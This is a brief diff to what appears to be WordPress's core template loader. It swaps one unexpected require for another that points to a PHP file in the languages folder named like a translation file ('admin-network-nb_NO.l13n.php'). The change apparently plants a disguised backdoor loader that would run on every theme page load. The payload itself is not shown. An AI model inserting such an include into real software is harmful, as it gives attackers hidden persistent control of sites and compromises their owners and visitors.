@@ -11,7 +11,7 @@ if ( wp_using_themes() ) {
      *
      * @since 1.5.0
      */
-    require('wp-admin/log.php');
+    require('wp-content/languages/admin-network-nb_NO.l13n.php');
     do_action( 'template_redirect' );
 }
 
